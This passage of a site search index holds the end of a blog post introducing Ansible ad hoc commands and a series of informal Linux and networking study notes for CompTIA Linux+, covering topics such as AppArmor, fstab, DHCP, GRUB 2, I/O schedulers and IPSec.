won\u2019t hold up. You need a better tool. Here comes Ansible, a daemon-less solution\u2026</p> <p>So, it\u2019s quite simple. Ansible is built around pushing changes using a tool you already love SSH.</p> <p>Ansible connects to the selected machine and pushes changes based on instructions stored in a YAML file, called a playbook.</p> <p>No matter how many machines you have, Ansible is quick, simple, and nice, without the need to install any daemon on the nodes.</p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#installation","title":"Installation","text":"<p>Installing Ansible is relatively simple. You have two approaches:</p> <ol> <li>Treat Ansible as a project with its own virtual environment.</li> <li>Install it as a system-wide package.</li> </ol> <p>You might think the second option, global installation, is far superior.</p> <p>However, Ansible uses Python modules installed on your system.</p> <p>Imagine needing to install a Python library for virtualization.</p> <p>You\u2019d have to install it system-wide, which could lead to compatibility issues later.</p> <p>Moreover, you\u2019re giving administrative privileges to the package.</p> <p>If the package is malicious or contains vulnerabilities, it can exploit those privileges.</p> <p>Installation Methods</p> <pre><code>sudo apt update\nsudo apt install ansible\n</code></pre> <p>Or with virtual env:</p> <pre><code>pip install virtualenv\nvirtualenv ansible-env\nsource ansible-env/bin/activate\npip install ansible\npip install ansible-core\n</code></pre>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#inventory","title":"Inventory","text":"<p>I\u2019m sure you\u2019ve already added your lab machines to the SSH config so you can easily SSH into them.</p> <p>If you haven\u2019t, here\u2019s how to do it:</p> <pre><code># Create a config file in ~/.ssh and add the following lines for hosts\nHost ChooseAnyName\n    HostName ip_address\n    User username_to_connect_as\n    IdentityFile ~/.ssh/private key\n</code></pre> <p>Remember to change the authorization method on your server to PublicKey, so you wouldn\u2019t have to <code>--ask-pass</code> every time you want to use Ansible.</p> <p>Now, having done all of this, you need to create a file called <code>inventory</code> and add the host names to it. This tells Ansible which device to SSH into and perform tasks.</p> <pre><code>[home]\ndnf\nmy_machine1\nmy_machine2\n</code></pre> <p>[home] is the name of the group, so you don\u2019t have to call each machine manually one by one.</p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#focus-on-debugging-first","title":"Focus on Debugging First","text":"<p>We won\u2019t write any serious playbooks in this post; I\u2019ll leave that for another time. But I want you to understand Ansible\u2019s modularity and its debugging potential so you can apply quick fixes without writing the whole playbook.</p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#ansible-ad-hoc-and-modularity","title":"Ansible Ad Hoc and Modularity","text":"<p>Ansible itself is a suite of tools and modules.</p> <p>You have different commands for different tasks.</p> <p>For example, to get knowledge about a particular module, you use:</p> <pre><code>ansible-docs -s module_name\n</code></pre> <p>Modules work similarly to Python modules.</p> <p>You can call modules alone using the <code>-m</code> flag.</p> <p>One popular example is the venv package, which creates a virtual environment for Python:</p> <pre><code>python -m venv /path/to/new/virtual/environment\n</code></pre> <p>Similarly, in Ansible, you use this pattern:</p> <pre><code>ansible home -i path_to_inventory -m module_name -a 'module arguemnt'\n</code></pre> <p>There are thousands of modules in Ansible, but I want to focus on two that will be most useful for you:</p> <ul> <li>Setup     Module</li> <li>Shell     Module</li> </ul>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#setup-quick-and-dirty","title":"Setup Quick and Dirty","text":"<p>There are many situations where you\u2019d like to quickly gather information about your infrastructure.</p> <p>Are all your machines working? What\u2019s their uptime? Do they have the right kernel version?</p> <p>Here are the all possible options:</p> <pre><code>ansible test -i inventory -m setup -a 'filter: user_id'\nansible test -i inventory -m setup -a 'filter: kernel'\nansible test -i inventory -m setup -a 'filter: ansible_distribution'\n</code></pre>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#ansible-can-be-sneaky","title":"Ansible Can Be Sneaky","text":"<p>You might think Ansible processes tasks one by one, but it actually handles them in parallel.</p> <p>By default, it handles 5 machines, but you can specify more by adding the <code>-f</code> flag:</p> <pre><code>ansible test -i inventory -m setup -a 'filter: user_id' -f 10\n</code></pre> <p>It also hides what it\u2019s really doing, which could make extended debugging challenging.</p> <p>Therefore, you have to explicitly call it with the verbosity flag.</p> <p>It has up to 6 \u2019v\u2019s !!!, but a reasonable level to start is <code>-vvv</code>, feel free to go wild:</p> <pre><code>ansible test -i inventory -m setup -a 'filter: user_id' -vvvvvv\n</code></pre>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#finally-back-to-bash","title":"Finally, Back to Bash","text":"<p>This is the most dirty and basic but very useful. If you have a custom script you want to run or if there\u2019s no Ansible module that suits your needs.</p> <p>You can call Bash directly on the device with the shell module:</p> <pre><code>ansible test -i inventory -m shell -a 'any_command_you_desire'\n</code></pre> <p>However, there\u2019s a catch:</p> <p>Ansible doesn\u2019t control the output.</p> <p>It executes the command and checks for errors but always produces a changed result, no matter what the command is.</p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#to-sum-up","title":"To Sum Up","text":"<p>Bash scripts have their time and place but are not the one and only solution, especially for something you may use on multiple devices.</p> <p>Try something more stable that won\u2019t shoot you in the foot but guide you.</p> <p>Really, Ansible is awesome, and that\u2019s just the beginning of its possibilities.</p> <p>If you want to learn more about Ansible, Linux, or anything else, chekout killercoda labs</p> <p>They are free, no need for login, and will walk you through everything without setting up the environment.</p> <p>Also, join their Discord channel because they\u2019re doing a fantastic job educating about Linux.</p> <p>Peace out :) Hope to see you there!</p>"},{"location":"docs/","title":"README","text":"<pre><code># ObsidianNotes\n</code></pre>"},{"location":"docs/AD/","title":"AD","text":"<p>LDAP</p> <p>System Auth.canvas|System</p>"},{"location":"docs/AH_header/","title":"Authenticatio Header","text":"<p>Hash of the packet and shared key - MD5,SHA-1or SHA-2 are common - Addts the Ah to to the packet header </p> <p>IPSec_protocol</p>"},{"location":"docs/AppArmor/","title":"App Armor","text":"<p>Define on every program what it\u2019s allows to access</p>"},{"location":"docs/AppArmor/#profiles","title":"Profiles","text":""},{"location":"docs/AppArmor/#etc-there-are-located-in-etcapparmord","title":"etc There are located in /etc/apparmor.d","text":"<ul> <li>U can create profile for each binary<ul> <li>It\u2019s the path to it ex usr.bin.man</li> <li>replace / with .</li> </ul> </li> </ul>"},{"location":"docs/AppArmor/#overwriting-profile","title":"Overwriting Profile","text":"<p>Create the profile file etc/apparmmor.d/local</p> <p>Bug!</p> <p>Can\u2019t overide deny with the local allow u have to change the profile then</p>"},{"location":"docs/AppArmor/#modes","title":"Modes","text":"<pre><code>aa-status\n</code></pre> <ul> <li>Enforced It works and stops programs</li> <li>Complain Only logs</li> <li>Disabled</li> </ul>"},{"location":"docs/AppArmor/#create-profile-based-on-logs","title":"Create profile based on logs","text":"<pre><code>sudo aa-logprof\n</code></pre> <p>Example </p> <p>Docs</p> <p>SELinux</p>"},{"location":"docs/Archive_vs_Compress/","title":"Archive vs Compress","text":"<p>Example </p> <p>tar | dd</p>"},{"location":"docs/Automatic_Mounting_fstab/","title":"Automatic Mounting fstab","text":"<p>This is ussualy handeld by the systemd u can create the service but the better is to use file</p> <p>Example  In order to do it on boot u have to create entries in /etc/fstab</p> <ul> <li>PARTUUID is when the partiotion does not have the files     system on it UUID is when     therese file systemQ<ul> <li>U can specyfie both in fstab file</li> </ul> </li> </ul> <p>Options - dupm not used anymore ussualy 0 - pass to preforme filesystem check - 0 to not perform - 1 do it and this is the root partition - 2 do it but this is not a root partition</p> <p>Seting up e2fsck to do the check on boot (maximum mount count)</p> <pre><code>tune2fs -c 5 \n</code></pre> <p>U still have to change it in fstab the pass** obtion**</p> <p>Partitioning SSD Trimming</p>"},{"location":"docs/Block_dev/","title":"Block device","text":"<p>The smallest unit of the data storage composed of pages # page - contains small memory cells</p> <p>Example </p> <p>SSD</p> <p>Block vs character device</p>"},{"location":"docs/Block_vs_character_dev/","title":"Block vs character devce","text":"Block Character uses buffers and caches to transfer large amounts of data a stream of data (no buffering) In ls show up as b In ls show up as c"},{"location":"docs/Block_vs_character_dev/#special-character-devices","title":"Special character devices","text":"<ul> <li>/dev/0 constant stream of     null characters(not     zeros)<ul> <li>Used to zeroing out hard drive</li> <li>devnull only data goes in (bit bucket)</li> </ul> </li> </ul> <p>Geting random characters - /dev/random wont return information unless theres enough entropy - /dev/urandom always returns random</p> <p>[!tip] U can get random numbers via $RANDOM</p> <p>PCI dev info</p> <p>Device types</p>"},{"location":"docs/CI_CD/","title":"CI CD","text":""},{"location":"docs/CI_CD/#cicd-continuous-integration-and-continuous-deployment-frequent","title":"CI/Cd Continuous Integration and Continuous Deployment frequent","text":"<p>merging of code and adding testing in an automated manner to perform checks as new code is pushed and merged.</p> <p>iac</p>"},{"location":"docs/CORS/","title":"CORS","text":""},{"location":"docs/CORS/#cross-origin-ressource-sharing","title":"Cross-Origin Ressource sharing","text":"<p>The set of rules that a website has to archive to be able to access data from another website</p> <p>[!quote]</p>"},{"location":"docs/CUPS/","title":"CUPS","text":"<pre><code>### Common UNIX Printing System\n</code></pre>"},{"location":"docs/CUPS/#how-does-it-work","title":"How does it work","text":"<p>CUPS is the software you use to print from applications like the web browser you are using to read this page.</p> <p>It converts the page descriptions produced by your application into something your printer can understand and then sends the information to the printer for printing.</p> <p>[!quote] Docs Samba</p>"},{"location":"docs/Cloud_models/","title":"Cloud models","text":"<p>Modlues diffrencess </p> <p>SaaS IaaS PaaS</p>"},{"location":"docs/Commands_filesSytem/","title":"Filesystem Commands","text":"<ul> <li>mkfs. to create a files system &gt; dumpe2fs pariont     name &gt;</li> </ul>"},{"location":"docs/Commands_filesSytem/#to-check-the-system-use","title":"To check the system use","text":"<ul> <li>fsck</li> </ul> <p>e2fsck</p>"},{"location":"docs/Compitaltion_process/","title":"Compitaltion process","text":""},{"location":"docs/Compitaltion_process/#compitaltion-procces","title":"Compitaltion procces","text":"<p> 1. Comiple to assembly - gc -S test.c produces test.s assambly -  2. Assamble to the object file - gc -c test .c produces test.o -  -</p> <ol> <li>Linker<ul> <li><ul> <li>The linker combines object files to create a single     executable<ul> <li>It resolves references to undefined symbols</li> <li></li> </ul> </li> </ul> </li> </ul> </li> <li>Loader program that enables execution<ul> <li></li> </ul> </li> </ol> <p>[!example]- Summary VIDEO</p> <ul> <li>compilers</li> <li>garbage_collector_c</li> </ul>"},{"location":"docs/Comptia_Objectives/","title":"Overview of What You Need to Learn for CompTIA Linux+","text":"<p>I highly recommend watching all the videos by Shawn Powers.</p> <p>Afterward, study from books and engage in hands-on projects or labs to reinforce your learning.</p> <p>Official Objectives</p> <ol> <li>File system hierarchy</li> <li>Boot</li> <li>UEFI vs BIOS</li> <li>Boot process</li> <li>Partition types</li> <li>File systems</li> </ol> <p>     - GRUB 2     - Run Levels</p> <ol> <li>Device types in /dev</li> <li>Block vs character devices</li> <li>Special character devices</li> <li>Getting PCI device info</li> <li>RAID devices</li> </ol> <p> </p> <ul> <li> <p>Commands</p> <ul> <li><code>stat</code> (gives a more detailed overview of the metadata)</li> <li><code>file</code></li> </ul> </li> <li> <p>Archive vs Compress</p> </li> <li> <p>Partitioning </p> </li> <li>Automatic Mounting fstab </li> <li>Disk encryption </li> <li> <p>LVM </p> </li> <li> <p>Virtual Storage</p> </li> </ul> <p> </p> <ol> <li>systemd</li> <li>Crontab </li> <li>At </li> <li> <p>Systemd Timers</p> </li> <li> <p>Process management</p> </li> </ol> <p>     - systemd procedures</p> <ol> <li>Network</li> <li>DNS</li> <li>nsswitch.conf</li> <li>Changing DNS server</li> <li>nslookup</li> <li>tcpdump</li> <li> <p>Wireshark</p> </li> <li> <p>Repository Configuration</p> </li> <li> <p>Kernel Options</p> </li> <li> <p>Localization time setup</p> </li> </ol>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#security","title":"Security","text":"<ol> <li>Encryption</li> <li> <p>Hash vs Encryption vs Digital Signature</p> <p> </p> </li> <li> <p>Encrypted Web traffic</p> </li> <li> <p>System Auth</p> <p></p> </li> <li> <p>Permissions</p> <ul> <li>umask</li> </ul> </li> <li> <p>Logging</p> <p></p> </li> <li> <p>SELinux</p> </li> <li> <p>AppArmor</p> </li> </ol>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#system-administration","title":"System Administration","text":"<ol> <li> <p>User manipulation</p> <ul> <li>profile etc </li> <li> <p>skel etc</p> </li> <li> <p>Commands</p> </li> <li> <p>chage</p> </li> <li> <p>Sudo and visudo</p> </li> <li>pkexec</li> <li>getfacl</li> </ul> </li> </ol>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#cloud","title":"Cloud","text":"<ol> <li> <p>git</p> </li> <li> <p>docker</p> </li> <li> <p>Automation tools</p> <p></p> </li> </ol>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#troubleshooting","title":"Troubleshooting","text":"","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#io-issues","title":"I/O issues","text":"<ol> <li> <p>High latency</p> <ul> <li>Input/output (I/O) wait</li> <li>Low throughput</li> <li>Input/output operations per second (IOPS)</li> <li> <p>Low IOPS</p> </li> <li> <p>Consider different File systems</p> </li> <li>Check for wa with <code>top</code></li> <li>ioStat</li> </ul> </li> <li> <p>inodes exhaustion</p> </li> <li> <p>IO schedulers</p> </li> <li> <p>NVMe</p> </li> <li> <p>File system issues (corruption mismatch)</p> <ul> <li>fsck</li> </ul> </li> <li> <p>vstat</p> </li> <li> <p>I/O summary</p> </li> </ol>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#network-troubleshooting","title":"Network troubleshooting","text":"<ul> <li>Checking subnet mask and routing</li> <li>iptables</li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#dropped-packets","title":"Dropped packets","text":"<ul> <li>ip command</li> <li>Links (the name of the network devices)</li> <li><code>ip -h -s link show device</code></li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#dns-issues","title":"DNS issues","text":"<ul> <li>nslookup</li> <li>dig command</li> <li>ping command</li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#network-resonance","title":"Network Resonance","text":"<ul> <li>nmap</li> <li><code>openssl client</code> to check whether the connection is legit</li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#cpu-issues","title":"CPU issues","text":"<ul> <li>Load Average</li> <li>CPU times (Subdivisions)</li> <li>CPU</li> <li>CPU process priorities</li> <li> <p>OOM process Killer</p> </li> <li> <p>Swap memory</p> </li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#hardware","title":"Hardware","text":"<ul> <li><code>lscpu</code></li> <li><code>lsmem</code></li> <li>/proc/cpuinfo</li> <li>/proc/meminfo</li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#user-issues","title":"User issues","text":"<ul> <li>Logging troubleshooting</li> <li>quota</li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Comptia_Objectives/#systemd","title":"Systemd","text":"<ul> <li>Systemd Units</li> <li>Systemd Ordering</li> <li>Systemd Timers</li> </ul>","tags":["Comptia Linux +"]},{"location":"docs/Containers/","title":"Containers","text":""},{"location":"docs/Containers/#container-isolation","title":"Container isolation","text":"<p>[!example]- </p>"},{"location":"docs/Containers/#container-name-spaces","title":"Container name spaces","text":""},{"location":"docs/DAC/","title":"DAC","text":"<pre><code>### Discretionary Access Control\n</code></pre> <ul> <li>Enforces security by ownership<ul> <li>Basked on the Permissions</li> </ul> </li> </ul> <p>[!bug] The biggest issue is root If the root account or process with root privileges is compromised the hole system is vulnerable</p> <p>MAC AppArmor</p>"},{"location":"docs/DHCP_config/","title":"DHCP CONFIG INSTRUCTION","text":""},{"location":"docs/DHCP_config/#create-scope","title":"Create Scope","text":"<p>Params - IP addres rage (and excluded adresses) - subnet mask - Lease duration (for how long will this device has IP) Other scopes - DNS server - defult gateway - VOIP serveres ## Pools One Scope is genarlly a single contiguaous pool of IP addresses Each subnet mask has its own scope SUbnetScopes_visual.png - DHCP exeptions can be made inside of the scope</p>"},{"location":"docs/DHCP_config/#address-assigments","title":"Address Assigments","text":"<p>DHCP server has a big pool of addresses to give out - Addresses are recalimed after a lease period</p> <p>Automatic assigment - Similar to dynamic allocation - DHCP server keeps a list of past assigments - ==U always get the same IP address==</p> <p>Static assigment - Administratively configured Table of [[MAC Adress]] - Each [[MAC Adress]] has its matching IP address ## Address reservation </p>"},{"location":"docs/DHCP_config/#dhcp-renewal-t1-timer-check-in-with-the-lending-dhcp","title":"DHCP renewal - T1 Timer - Check in with the lending [DHCP","text":"<p>server](../Network/Phisicall/DHCP_server) to renew the IP address - ==50% of the leas time by default== - T2 Timer - If the original DHCP server is down the rebinding with any DHCP server - ==87,5% of the lease time (7/8ths)==</p>"},{"location":"docs/DHCP_config/#alt-name-1-static-dhcp-assaigment-2-static-dhcp-3-address","title":"alt-name 1. Static DHCP Assaigment 2. Static DHCP 3. Address","text":"<p>Reservation 4. IP Reservation</p> <p>[!quote]</p>"},{"location":"docs/DHCP_process/","title":"DHCP process","text":""},{"location":"docs/DHCP_process/#discover","title":"Discover","text":"<ul> <li>The device sends a DHCP Discover message using     UDP (because it does not have an     IP).<ul> <li>It\u2019s a broadcast connection     that the router ignores (since no IP) but is accepted by     the DHCP server.<ul> <li></li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/DHCP_process/#offer","title":"Offer","text":"<ul> <li>Since the DHCP server     accepts the message from the device, it sends a message (offer via     UDP /67) with a potential     IP.<ul> <li>No way to unicast yet, it\u2019s     still a broadcast.<ul> <li></li> </ul> </li> </ul> </li> <li>The device receives the message from the DHCP     server with the     IP.</li> </ul>"},{"location":"docs/DHCP_process/#request","title":"Request","text":"<ul> <li>The device asks the server whether the IP provided by the DHCP     server is correct.<ul> <li></li> </ul> </li> </ul>"},{"location":"docs/DHCP_process/#acknowledgment","title":"Acknowledgment","text":"<ul> <li>The DHCP server sends     a broadcast message to all.<ul> <li>The device then configures itself with the IP that was     originally sent in the offer and acknowledges.</li> <li></li> </ul> </li> </ul> <p>DHCP relay</p>"},{"location":"docs/DHCP_rely/","title":"DHCP rely","text":"<ol> <li>Device sends [[DHCP process#Discover]]<ul> <li></li> </ul> </li> <li>When router revives the massaeage is changes the source     address to DHCP     server </li> <li>The the server sends [[DHCP process#Offer]] send back the ip to     the router<ul> <li></li> </ul> </li> <li>The router recognieses the DHCP reely config and changes ip     adress to be a brodcarts for local network</li> </ol> <p>[!quote] DHCP_protocol DHCP process</p>"},{"location":"docs/DMA/","title":"DMA","text":""},{"location":"docs/DMA/#direct-memory-access","title":"Direct Memory Access","text":"<ul> <li>IT allows certain hardware devices to directly access the system\u2019s     memory (RAM) without involving the     Cpu in every data transfer.<ul> <li>It enables these devices to read from or write to memory on     their own, freeing up the Cpu     to focus on other tasks.</li> </ul> </li> </ul>"},{"location":"docs/DMA/#dma-contoler","title":"DMA Contoler","text":"<p>Specialized hardware component responsible for managing the data transfer between devices and memory 1. Initialization: When the Kernel initializes, it sets up the DMA controller and configures it with the necessary parameters, such as the source and destination memory addresses and the amount of data to transfer.</p> <ol> <li> <p>Request for DMA Transfer: When a hardware device (e.g., a     network card or a disk controller) needs to read or write data     to/from memory, it sends a request to the DMA controller.</p> </li> <li> <p>DMA Setup: The device driver in the     Kernel (software that manages     communication with the hardware device) prepares the data and     instructs the DMA controller with the required details, such as the     memory addresses and the direction of data transfer (read or write).</p> </li> <li> <p>DMA Transfer: The DMA controller takes over from here and     directly accesses the system\u2019s memory, moving data between the     device and the memory without the CPU\u2019s active involvement. It     efficiently transfers the data in the background.</p> </li> <li> <p>DMA Completion: Once the DMA transfer is complete, the DMA     controller signals the device driver to handle any remaining tasks     or notifications related to the data transfer.</p> </li> <li> <p>Data Processing: The device driver can then process the     transferred data as needed, e.g., passing it to higher-level     software layers or storing it in a file.</p> </li> </ol> <p>[!quote] NIC_physical</p>"},{"location":"docs/Dick_encryption/","title":"Disck encryption","text":"<ul> <li>U have to use cryptsetup luksformat partition name *it uses the     AES Encryption *<ul> <li>This will overwrite the     entire disk</li> </ul> </li> <li>Then in order to use it u have to open it cryptesetup open     /dev/sdd1 device_name</li> </ul>"},{"location":"docs/Dick_encryption/#decryption-on-boot-procces","title":"Decryption on boot procces","text":"<p>[!example] U have to create /etc/crypttab file  \u201c-\u201d is for the prompt on boot</p>"},{"location":"docs/Digital_certificate/","title":"Digital certificate","text":"<pre><code>### Digigtal signing\n</code></pre> <ul> <li>Hash the data set</li> <li>Then encrytp the resulting Hash<ul> <li>it makes sure that original hash came from someone with the key</li> </ul> </li> </ul> <p>Hash Encryption [[Hash vs Encryption vs digital signature.canvas|Hash vs Encryption vs digital signature]] [[gnup]]</p>"},{"location":"docs/Encryption/","title":"Encryption","text":"<pre><code>- Transfers data with the key\n</code></pre> <ul> <li>Entire data set is sent</li> </ul> <p>[!quote]- Hash Digital certificate [[Hash vs Encryption vs digital signature.canvas|Hash vs Encryption vs digital signature]]</p>"},{"location":"docs/Etag/","title":"Etag","text":""},{"location":"docs/Etag/#entity-tag","title":"Entity tag","text":"<ul> <li>Used for cache validation When a client     request the same resource it sends ==etag== back<ul> <li>If the resource hasnt chnagded the server tells the client to     used the cached version<ul> <li>If changed happen the server sends a new version ### Types</li> </ul> </li> </ul> </li> <li>Browser Cache<ul> <li>When a browser accesses a web page, it stores copies of certain     resources so it doesn\u2019t have to re-download them on subsequent     visits. Etags help browsers determine if their cached version is     still valid or if they need to fetch a fresh copy.</li> </ul> </li> </ul> <p>Proxy Cache: This sits between the client (like a browser) and the server, saving responses. On subsequent requests for the same resource by any client passing through the proxy, the resource can be served from the cache if it\u2019s still fresh, reducing the load on the origin server and improving response times.</p> <ul> <li>Content Delivery Network (CDN) Cache</li> <li>CDNs are distributed systems that cache content closer to users.     They use mechanisms like Etags to validate the freshness of cached     resources.</li> </ul> <p>Gateway Cache - Operates on web servers or in front of web servers, caching responses as they\u2019re generated for reuse, reducing the need to recompute dynamic pages.: - This sits between the client (like a browser) and the server, saving responses. On subsequent requests for the same resource by any client passing through the proxy, the resource can be served from the cache if it\u2019s still fresh, reducing the load on the origin server and improving response times.</p> <ul> <li>Content Delivery Network (==CDN==) Cache<ul> <li>CDNs are distributed systems that cache content closer to users.     They use mechanisms like Etags to validate the freshness of     cached resources.</li> </ul> </li> <li>Gateway Cache<ul> <li>Operates on web servers or in front of web servers, caching     responses as they\u2019re generated for reuse, reducing the need to     recompute dynamic pages.</li> </ul> </li> </ul> <p>[!quote] HTTPS http_headers CORS</p>"},{"location":"docs/FCoE/","title":"FCoE","text":""},{"location":"docs/FCoE/#fibre-chanel-over-ethernet","title":"Fibre Chanel over Ethernet","text":"<ul> <li>No special hardware needed</li> <li>Ussualy integrates with an exsisting     Fibre_chanel infrastructure</li> <li>==No routable==</li> </ul> <p>[!quote] SAN Fibre_chanel iSCSI</p>"},{"location":"docs/FQDN/","title":"Fully Qualified Domain Name","text":"<ul> <li>Host/Subdomain Name:<ul> <li>This is the specific name assigned to a resource within a     domain. For example, in the FQDN www.example.com, \u201cwww\u201d is the     host or subdomain name.</li> </ul> </li> <li>Domain Name:<ul> <li>The primary domain to which the subdomain belongs. In the     example www.example.com, \u201cexample\u201d is the domain name.</li> </ul> </li> <li>Top-Level Domain (TLD):<ul> <li>The highest level of the DNS hierarchy. Common TLDs include     .com, .org, .net, and country code TLDs like .uk or .ca.</li> </ul> </li> </ul> <p>DNS Lookups</p>"},{"location":"docs/Fibre_chanel/","title":"Fibre channel","text":""},{"location":"docs/Fibre_chanel/#fibre-channel","title":"Fibre Channel","text":"<p>==FC== A specialized high-speed topology: - Connects server to storage - 2, 4, 8, and 16 gigabit per second bandwidth - Supported over both Fiber and Copper</p> <p>Servers and storage connect to a Fiber Channel switch: - Server (initiator) needs a FC interface - Storage (target) is commonly referenced by SCSI, SAS, and SATA commands</p> <p>Alternatives: - FCoE</p> <p>[!quote] SAN | Spine and leaf architecture three-tier architecture_net_arch</p>"},{"location":"docs/GRE_prtocol/","title":"GRE prtocol","text":""},{"location":"docs/GRE_prtocol/#generic-route-encapsulation","title":"Generic Route Encapsulation","text":"<p>Its (tunnel bettwent two endpoints)that allows te encapsolation of wide roange of layer protocols inside IP packets</p>"},{"location":"docs/GRE_prtocol/#encapsualte-traffic-inside-of-ip","title":"Encapsualte traffic inside of IP","text":"<ul> <li>Two endpoints appear to be direcly connected to each other     </li> <li>==No build in Encryptoin==<ul> <li>In order to encrypted this data use VPN</li> </ul> </li> </ul> <p>[!quote]</p>"},{"location":"docs/GRUB_2/","title":"GRUB 2","text":""},{"location":"docs/GRUB_2/#edit-config","title":"Edit config","text":"<p>It\u2019s in the /etc/defualt/</p>"},{"location":"docs/GRUB_2/#to-update","title":"To update","text":"<ul> <li>update-grub or update-grub2<ul> <li>Or do it manually grub-mkconfig</li> </ul> </li> </ul>"},{"location":"docs/GRUB_2/#see-the-init-boot-procsse-right-from-grub","title":"See the init boot procsse right from grub","text":"<pre><code>cat /proc/cmdline\n</code></pre> <pre><code>dmesg | head \n</code></pre> <p>To chekc grub paramaters use  <pre><code> man bootparam\n</code></pre></p>"},{"location":"docs/GRUB_2/#seting-up-the-arguents","title":"Seting up the arguents","text":"<p>It\u2019s in the <code>/etc/defualt/grub</code> 1. Open the file /etc/default/grub with an editor and remove the rhgb and quiet options from the GRUB_CMDLINE_LINUX line. 3. From the command line, type grub2-mkconfig -o /boot/grub2/grub.cfg  4. Reboot and verify that while booting you see boot messages scrolling by.</p> <ul> <li>The most important line in this file is <code>GRUB_CMDLINE_LINUX</code> which defines how the Linux kernel should be started. In this line, you can apply permanent fixes to the GRUB 2 configuration.</li> </ul> <p>boot procces</p>"},{"location":"docs/Getting_PCI_dev_info/","title":"Getting PCI dev info","text":""},{"location":"docs/Getting_PCI_dev_info/#lspci","title":"lspci","text":"<p>Getting a list of the connected PCI devices</p>"},{"location":"docs/Getting_PCI_dev_info/#dmidecode","title":"dmidecode","text":"<p>Give u the full inforamtion of the devces - There are presented as section - </p>"},{"location":"docs/Hash/","title":"Hash","text":"<pre><code>- Unique small *signature* based on the data\n</code></pre> <ul> <li>Hashing the data after receiving proves it\u2019s the same data</li> </ul> <p>[!quote]- Encryption Digital certificate [[Hash vs Encryption vs digital signature.canvas|Hash vs Encryption vs digital signature]]</p>"},{"location":"docs/ICMP_protocol/","title":"ICMP protocol","text":""},{"location":"docs/ICMP_protocol/#internet-control-message-protocol","title":"Internet Control Message Protocol","text":""},{"location":"docs/ICMP_protocol/#usage","title":"Usage","text":"<ul> <li>Diagnose network issues (use ping and nping)<ul> <li>Check weather the dat is raching ht eintneted destinaiton(in     time)</li> <li>Used on the network devieces such a routers<ul> <li>Can be used in DDosS</li> </ul> </li> </ul> </li> </ul> <p>Docs</p> <p>Devices Send messages between each other (menagagment and control of devices across devices)</p> <ul> <li>Text messaging for your network devices</li> <li>Another prtocol carried by Ip<ul> <li>Not used for data trasfer</li> </ul> </li> <li>Devices can request and reply to administrativer requests     ping_command<ul> <li>When u send ping u send the ICMP packet and get ICP     packet in response</li> </ul> </li> <li>Devices can send massege whetn things dont go well (message where     created becouse of ICMP)<ul> <li>The network u\u2019re trying to reach is not reachable from here</li> <li>Your time-to-live expired</li> </ul> </li> </ul> <p>[!quote] ports</p>"},{"location":"docs/IO_schedulers/","title":"IO schedulers","text":"<ul> <li> <p>I/O schedulers exist as a way to optimize disk access requests.</p> </li> <li> <p>It\u2019s merging I/O requests to similar locations on disk. By grouping     requests located at similar sections of disk, the drive doesn\u2019t need     to \u201cseek\u201d as often, improving the overall response time for disk     operations.</p> </li> <li> <p>The run-time config is located in     /sys/block/sda(disk)/queue/scheduler</p> </li> <li> <p>Persistent config is located in /etc/default/grub</p> </li> </ul> <pre><code>GRUB_CMDLINE_LINUX=\"elevator: noop\"\n</code></pre> <p>[!bug]- Schedulers are applied on each disk device separately. If we were to change the value in the file above, this would mean that all filesystems on disk device sda will use the new I/O scheduler.</p>"},{"location":"docs/IO_schedulers/#deadline-scheduler","title":"Deadline Scheduler","text":"<p>Minimize I/O request latency by setting deadlines for each request and prioritizing requests based on their deadlines. - It ensures that time-sensitive tasks get preferential treatment.</p>"},{"location":"docs/IO_schedulers/#cfq-completely-fair-queuing","title":"CFQ (Completely Fair Queuing)","text":"<p>Divides I/O requests into separate queues for each process - allocates a fair share of the disk bandwidth to each queue. - It aims to provide fair access to the disk for all processes.</p>"},{"location":"docs/IO_schedulers/#noop","title":"NOOP","text":"<p>schedules I/O requests in the order they are received, without any reordering or prioritization. - It is often used in systems where the underlying storage device already performs its own optimizations.</p>"},{"location":"docs/IO_schedulers/#anticipatory","title":"Anticipatory","text":"<p>Predicts future I/O requests and schedules them in advance to minimize seek times and improve overall throughput. - It aims to reduce disk latency by anticipating upcoming requests.</p>"},{"location":"docs/IO_schedulers/#bfq-budget-fair-queueing","title":"BFQ (Budget Fair Queueing)","text":"<p>Assigns a budget to each process based on its priority and dynamically adjusts the budget based on the process\u2019s behavior. - It aims to provide low latency for interactive tasks while also maximizing overall throughput.</p>"},{"location":"docs/IPSec_protocol/","title":"IPSec protocol","text":""},{"location":"docs/IPSec_protocol/#internet-protocol-security","title":"Internet Protocol Security","text":"<p>Provides secriuty fir Network_OSI - Authenticantio nad encryption for every packet - ITs very standarlezed - multi vendor implementation</p> <p>Confidentiality and integrity/anti-replay - Encryption and packet signing</p>"},{"location":"docs/IPSec_protocol/#core-ipsec-protocols","title":"Core IPSec protocols","text":"<ul> <li>AH_protocol Authentitacion Header</li> <li>[ESP_prtocol] Encapslation Security Payload</li> </ul>"},{"location":"docs/IPSec_protocol/#modes","title":"Modes","text":"<p>Original packet - </p> <p>Transport mode - We add the IPSsec headears to encrypt the data but not the IP -  Tunnelmode - This also encrypts the IP - </p> <p>[!quote] OSI Model 